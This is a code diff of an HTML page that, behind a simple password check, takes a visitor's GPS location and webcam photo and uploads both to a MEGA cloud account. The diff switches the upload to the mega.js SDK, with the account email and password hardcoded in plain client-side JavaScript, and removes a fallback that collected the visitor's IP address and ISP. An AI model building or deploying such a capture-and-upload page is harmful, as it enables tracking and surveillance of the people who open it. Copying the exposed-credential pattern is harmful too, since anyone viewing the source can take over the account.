@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upload to MEGA.nz</title>
+    <title>Automatic Photo and Location Upload to MEGA</title>
     <style>
         body {
             font-family: 'Poppins', sans-serif;
@@ -26,16 +26,6 @@
             outline: none;
             border: 1px solid #58a6ff;
         }
-        button {
-            background: #58a6ff;
-            color: white;
-            cursor: pointer;
-            box-shadow: 0px 0px 10px #58a6ff;
-        }
-        button:hover {
-            transform: scale(1.1);
-            box-shadow: 0px 0px 20px #58a6ff;
-        }
         #status {
             font-size: 20px;
             font-weight: bold;
@@ -50,22 +40,26 @@
             to { color: #ffffff; }
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/megaio/mega.js"></script>
 </head>
 <body>
-    <h1>📡 Upload Photo and Location to MEGA.nz</h1>
+    <h1>📸 Automatic Photo and Location Upload to MEGA</h1>
+
     <div id="auth-section">
         <h2>🔒 Enter Password to Access</h2>
         <input type="password" id="password" placeholder="Enter password">
         <button onclick="checkPassword()">Submit</button>
         <p id="auth-status" style="color: red;"></p>
     </div>
+
     <div id="main-content" style="display: none;">
         <p id="status">Initializing...</p>
         <canvas id="canvas" style="display: none;"></canvas>
     </div>
 
     <script>
-        const megaUploadURL = 'https://mega.nz/submit/g2omOD';  // Updated MEGA file request link
+        const email = "darknp273@gmail.com";
+        const password = "Nipunapromod@1";
 
         // Function to Update Status on Web Page
         function updateStatus(message, isError = false) {
@@ -77,9 +71,7 @@
         // Password Check
         function checkPassword() {
             const enteredPassword = document.getElementById("password").value;
-            const correctPassword = "Nipunapromod@1"; 
-
-            if (enteredPassword === correctPassword) {
+            if (enteredPassword === password) {
                 updateStatus("✅ Password correct.");
                 document.getElementById("auth-section").style.display = "none";
                 document.getElementById("main-content").style.display = "block";
@@ -90,7 +82,8 @@
             }
         }
 
-        async function startProcess() {
+        // Start the Automatic Process
+        function startProcess() {
             updateStatus("📍 Requesting GPS location...");
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -101,28 +94,14 @@
                     capturePhoto(loc);
                 },
                 (error) => {
-                    updateStatus("❌ GPS access denied! Attempting IP-based location...", true);
-                    getIPLocation();
+                    updateStatus("❌ GPS access denied!", true);
                 },
                 { enableHighAccuracy: true, maximumAge: 0 }
             );
         }
 
-        async function getIPLocation() {
-            updateStatus("🌐 Fetching IP-based location...");
-            try {
-                const response = await fetch("https://ipapi.co/json/");
-                const data = await response.json();
-                const loc = `📍 IP Location: ${data.city}, ${data.region}, ${data.country}\n🌍 ISP: ${data.org}\n🔢 IP: ${data.ip}`;
-                updateStatus(`✅ IP Location found: ${loc}`);
-                capturePhoto(loc);
-            } catch (error) {
-                updateStatus("❌ Failed to get IP-based location.", true);
-            }
-        }
-
         // Capture Photo from Webcam
-        async function capturePhoto(loc) {
+        async function capturePhoto(location) {
             updateStatus("📸 Attempting to access camera...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -137,49 +116,58 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     stream.getTracks().forEach(t => t.stop());
                     updateStatus("✅ Photo captured successfully.");
-                    uploadToMega(canvas, loc);
+                    uploadToMega(canvas, location);
                 };
             } catch (error) {
                 updateStatus("❌ Failed to access camera.", true);
             }
         }
 
-        // Upload Photo and Location to MEGA
-        function uploadToMega(canvas, location) {
-            const formData = new FormData();
-            
-            // Create file from canvas image
-            canvas.toBlob((blob) => {
-                formData.append('file', blob, 'photo.jpg');
-                
-                // Add location as text file
+        // Upload Files to MEGA using SDK
+        async function uploadToMega(canvas, location) {
+            updateStatus("🚀 Logging into MEGA...");
+            const storage = new mega.Storage({ email, password, autologin: true });
+
+            storage.on('ready', () => {
+                updateStatus("✅ Authenticated! Preparing to upload...");
+
+                // Prepare files
+                const imageDataUrl = canvas.toDataURL("image/jpeg");
+                const imageBlob = dataURLtoBlob(imageDataUrl);
                 const locationBlob = new Blob([location], { type: 'text/plain' });
-                formData.append('file', locationBlob, 'location.txt');
 
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', megaUploadURL, true);
+                // Upload photo
+                const photoUpload = storage.upload({ name: 'photo.jpg' }, imageBlob);
+                photoUpload.on('complete', (file) => {
+                    updateStatus(`✅ Photo uploaded: ${file.download}`);
+                });
 
-                xhr.upload.onprogress = (event) => {
-                    if (event.lengthComputable) {
-                        const percentComplete = Math.round((event.loaded / event.total) * 100);
-                        updateStatus(`Uploading: ${percentComplete}%`);
-                    }
-                };
+                // Upload location file
+                const locationUpload = storage.upload({ name: 'location.txt' }, locationBlob);
+                locationUpload.on('complete', (file) => {
+                    updateStatus(`✅ Location uploaded: ${file.download}`);
+                });
 
-                xhr.onload = () => {
-                    if (xhr.status === 200) {
-                        updateStatus('✅ File uploaded successfully!');
-                    } else {
-                        updateStatus(`❌ Upload failed with status: ${xhr.status}`, true);
-                    }
-                };
+                // Error handling
+                photoUpload.on('error', (err) => {
+                    updateStatus(`❌ Photo upload failed: ${err}`, true);
+                });
+                locationUpload.on('error', (err) => {
+                    updateStatus(`❌ Location upload failed: ${err}`, true);
+                });
+            });
 
-                xhr.onerror = () => {
-                    updateStatus('❌ An error occurred during file upload.', true);
-                };
+            storage.on('error', (err) => {
+                updateStatus(`❌ MEGA login failed: ${err}`, true);
+            });
+        }
 
-                xhr.send(formData);
-            }, 'image/jpeg');
+        // Convert Data URL to Blob
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
+            return new Blob([u8arr], { type: mime });
         }
     </script>
 </body>
